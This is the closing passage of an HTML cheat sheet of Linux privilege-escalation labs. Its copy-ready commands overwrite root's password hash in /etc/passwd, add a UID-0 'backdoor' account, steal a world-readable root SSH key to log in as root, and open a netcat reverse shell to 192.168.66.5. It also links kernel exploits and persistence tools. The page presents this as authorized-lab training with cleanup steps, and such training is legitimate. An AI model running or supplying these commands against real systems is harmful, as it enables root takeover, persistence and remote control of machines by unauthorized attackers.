<span class="c-comment"># 2. Generate hash</span>
hash=$(openssl passwd -6 "mani")
echo "$hash"

<span class="c-comment"># 3. Backup and patch</span>
cp /etc/passwd /etc/passwd.bak
sudo sed -i "s|^root:[^:]*:|root:${hash}:|" /etc/passwd
head -1 /etc/passwd
<span class="c-comment"># root:$6$dG91Y2...:0:0:root:/root:/bin/bash</span>

<span class="c-comment"># 4. Become root</span>
su root</code></pre></div>
<h3><span class="tag tag-exploit">ALTERNATIVE</span> Add new root user</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>hash=$(openssl passwd -6 "mani")
echo "backdoor:${hash}:0:0:root:/root:/bin/bash" &gt;&gt; /etc/passwd
su backdoor    <span class="c-comment"># Enter "mani" → root</span></code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo cp /etc/passwd.bak /etc/passwd
sudo chmod 644 /etc/passwd
sudo rm /etc/passwd.bak</code></pre></div>
</div></details>

<details class="x" id="s26">
<summary><span class="sum-num">26</span> Readable Root SSH Key <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code><span class="c-comment"># Install SSH server</span>
sudo apt update && sudo apt install openssh-server -y
sudo systemctl start ssh && sudo systemctl enable ssh

<span class="c-comment"># Allow root login</span>
sudo sed -i 's/^#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config &gt; /dev/null
sudo systemctl restart ssh

<span class="c-comment"># Generate key pair (as root)</span>
ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
cat /root/.ssh/id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

<span class="c-comment"># Simulate misconfiguration – make private key world-readable</span>
chmod o+r /root/.ssh/id_rsa
ls -l /root/.ssh/id_rsa    <span class="c-comment"># -rw-r--r--</span>

<span class="c-comment"># Copy to kali user</span>
cp /root/.ssh/id_rsa /home/kali/stolen_key
chown kali:kali /home/kali/stolen_key && chmod 600 /home/kali/stolen_key
exit

<span class="c-comment"># As kali – SSH in as root</span>
ssh -i /home/kali/stolen_key root@localhost
<span class="c-comment"># you got root</span></code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>rm /root/.ssh/id_rsa /root/.ssh/id_rsa.pub
rm /home/kali/stolen_key
&gt; /root/.ssh/authorized_keys
sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
systemctl restart ssh</code></pre></div>
</div></details>

<details class="x" id="s27">
<summary><span class="sum-num">27</span> Reverse Shell via nc <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo nc -e /bin/sh 192.168.66.5 4444

nc -lvnp 4444</code></pre></div>
</div></details>

<details class="x" id="s28">
<summary><span class="sum-num">28</span> Kernel Exploits <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>uname -a    <span class="c-comment"># Get kernel version → search exploit-db</span></code></pre></div>
<p>🔗 <a href="https://www.exploit-db.com/exploits/52591" style="color:var(--enum)">Linux Kernel – Local Privilege Escalation (52591)</a></p>
<p>🔗 <a href="https://www.exploit-db.com/exploits/52585" style="color:var(--enum)">Linux Kernel – Local Privilege Escalation (52585)</a></p>
</div></details>

<details class="x" id="s29">
<summary><span class="sum-num">29</span> Linux Internals Reference Notes <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<h3>Cache Indexing Methods</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>reference</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>VIVT — Virtually Indexed,  Virtually Tagged
PIPT — Physically Indexed, Physically Tagged
PIVT — Physically Indexed, Virtually Tagged
VIPT — Virtually Indexed,  Physically Tagged</code></pre></div>
<h3>Concepts</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>topics</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>Seccomp, KSM, MMU, I/O buses, CPU execution ports
CPU mesh, Linux Kernel Crypto Subsystem
Cross-core attack, cross-CPU attack
File I/O: Buffered I/O | Page cache | Standard library | Synchronized I/O
SELinux vs AppArmor</code></pre></div>
<h3>Systemd / Session</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo visudo
nano /etc/sudoers
systemd-cgls --unit user.slice
pstree -slap</code></pre></div>
<h3>D-Bus IPC</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code><span class="c-comment"># Check D-Bus status</span>
systemctl status dbus
ps aux | grep dbus
busctl list

<span class="c-comment"># Enumerate services</span>
dbus-send --system --dest=org.freedesktop.DBus \
  --type=method_call --print-reply \
  /org/freedesktop/DBus org.freedesktop.DBus.ListNames

<span class="c-comment"># Introspect a service</span>
gdbus introspect --system --dest org.freedesktop.NetworkManager \
  --object-path /org/freedesktop/NetworkManager
busctl introspect org.freedesktop.NetworkManager /org/freedesktop/NetworkManager

<span class="c-comment"># Monitor traffic</span>
busctl monitor
dbus-monitor --system
dbus-monitor --system "destination='org.freedesktop.systemd1'"</code></pre></div>
<h3>Tools</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>https://github.com/Aegrah/PANIX.git
https://github.com/The-Z-Labs/linux-exploit-suggester.git
https://github.com/peass-ng/PEASS-ng.git

pip install gtfobins-cli --break-system-packages
gtfo python</code></pre></div>
</div></details>

</div><!-- end privesc phase -->
</div><!-- end container -->

<footer>
  <p>⚠️ For educational use in authorized environments only. Always run cleanup steps after each lab.</p>
  <p style="margin-top:8px">Curated by <strong>m.manikandan</strong></p>
</footer>

<script>
// Particles
const p=document.getElementById('particles');
for(let i=0;i<30;i++){
  const d=document.createElement('div');
  d.className='particle';
  const colors=['#58a6ff','#ffa657','#ff7b72','#3fb950'];
  d.style.cssText=`left:${Math.random()*100}%;animation-duration:${8+Math.random()*12}s;animation-delay:${Math.random()*10}s;background:${colors[Math.floor(Math.random()*4)]};`;
  p.appendChild(d);
}

// Copy buttons
function copyCode(btn){
  const pre=btn.closest('.code-wrap').querySelector('pre');
  const text=pre.innerText||pre.textContent;
  navigator.clipboard.writeText(text).then(()=>{
    btn.textContent='✓ copied';btn.classList.add('copied');
    setTimeout(()=>{btn.textContent='copy';btn.classList.remove('copied');},2000);
  });
}

// Smooth scroll for TOC links
document.querySelectorAll('.toc-link').forEach(a=>{
  a.addEventListener('click',e=>{
    e.preventDefault();
    const target=document.querySelector(a.getAttribute('href'));
    if(target){target.scrollIntoView({behavior:'smooth',block:'start'});target.open=true;}
  });
});
</script>
</body>
</html>
